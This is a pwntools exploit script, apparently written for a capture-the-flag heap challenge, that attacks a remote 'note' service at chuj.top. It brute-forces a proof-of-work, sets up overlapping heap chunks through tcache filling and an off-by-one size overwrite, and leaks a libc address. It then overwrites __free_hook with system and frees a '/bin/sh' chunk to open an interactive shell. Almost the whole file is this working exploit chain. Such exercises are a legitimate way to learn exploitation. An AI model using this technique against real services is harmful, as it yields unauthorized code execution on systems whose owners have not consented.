# -*- coding: UTF-8 -*-
import hashlib
from pwn import *

context.log_level = 'debug'
context.terminal = ["/usr/bin/tmux","sp","-h"]
local = False
# local = True

io = remote('chuj.top', 52896) # chuj.top 51505
libc = ELF('./libc.so.6')
# io = process('note')
# libc = ELF('/home/yrl/glibc-all-in-one/libs/2.27-3ubuntu1.4_amd64/libc.so.6')

l64 = lambda      :u64(io.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
l32 = lambda      :u32(io.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
rl = lambda	a=False		: io.recvline(a)
ru = lambda a,b=True	: io.recvuntil(a,b)
rn = lambda x			: io.recvn(x)
sn = lambda x			: io.send(x)
sl = lambda x			: io.sendline(x)
sa = lambda a,b			: io.sendafter(a,b)
sla = lambda a,b		: io.sendlineafter(a,b)
irt = lambda			: io.interactive()
dbg = lambda text=None  : gdb.attach(io, text)
lg = lambda s			: log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
lgs = lambda s			: log.info('\033[1;31;40m %s --> %s \033[0m' % (s, eval(s)))
uu32 = lambda data		: u32(data.ljust(4, '\x00'))
uu64 = lambda data		: u64(data.ljust(8, '\x00'))
ur64 = lambda data		: u64(data.rjust(8, '\x00'))
def add(idx,size,content):
	sl('1')
	sa('index?\n>> ',str(idx))
	sa('size?\n>> ',str(size))
	sa('content?\n>> ',content)
def show(idx):
	sl('2')
	sla('index?\n>> ',str(idx))
		
def delete(idx):
	sl('3')
	sla('index?\n>> ',str(idx))

def edit(idx,content):
    sl('4')
    sla('index?\n>> ',str(idx))
    sn(content)

if local == False:
    ru('sha256(????) == ')
    sha256 = rn(64)
    lgs('sha256')
    import hashlib
    tmpstr = ''
    flag = False
    for i in range(48,127):
        for j in range(48,127):
            for k in range(48,127):
                for n in range(48,127):
                    tmpstr = chr(i)+chr(j)+chr(k)+chr(n)
                    hash=hashlib.sha256()
                    hash.update(bytes(tmpstr))
                    s = hash.hexdigest()
                    if s == sha256:
                        print(tmpstr)
                        flag = True
                        break
                if flag == True:
                    break
            if flag == True:
                break
        if flag == True:
            break


    sa('your ????> ',tmpstr)

for i in range(7):
    add(i,0xf8,"aaaa")
add(7,0xf8,"aaaa")#7
add(8,0x88,"aaaa")#8
add(9,0xf8,"aaaa")#9
add(10,0x88,"aaaa")#10
for i in range(7):
    delete(i)
delete(8)
delete(7)
add(8,0x88,"a"*0x80+p64(0x90+0x100)) #8
delete(9)
for i in range(7):
    add(i,0xf8,"/bin/sh\x00")
add(7,0xf8,"aaaa")#7
show(8)
libcbase = l64()-0x3ebca0
lg('libcbase')
freehook = libcbase + libc.sym['__free_hook']
reallochook = libcbase + libc.sym['__realloc_hook']
realloc = libcbase + libc.sym['realloc']
system = libcbase + libc.sym['system']
binsh = libcbase + libc.search('/bin/sh').next()
lg('freehook')
lg('reallochook')
lg('realloc')
lg('system')
lg('binsh')

# add(15,0x88,"aaaa")#15
# add(14,0xf8,"aaaa")#14

# for i in range(7):
#     add(i,0x68,"aaaa")
# add(7,0x68,"aaaa")#7
# add(8,0x88,"aaaa")#8
# add(9,0x68,"aaaa")#9
# add(10,0x88,"aaaa")#10
# for i in range(7):
#     delete(i)
# delete(8)
# delete(7)
# add(8,0x88,"a"*0x80+p64(0x70+0x90)) #8
# delete(9)

add(9,0x100,"dddd")
delete(9)
edit(7,0xf0*'a'+p64(0x100))
delete(8)
add(8,0x100,p64(freehook)) #0
# dbg()
add(9,0xf8,p64(freehook)) #9
add(11,0xf8,p64(system)) # 11
delete(5)
irt()

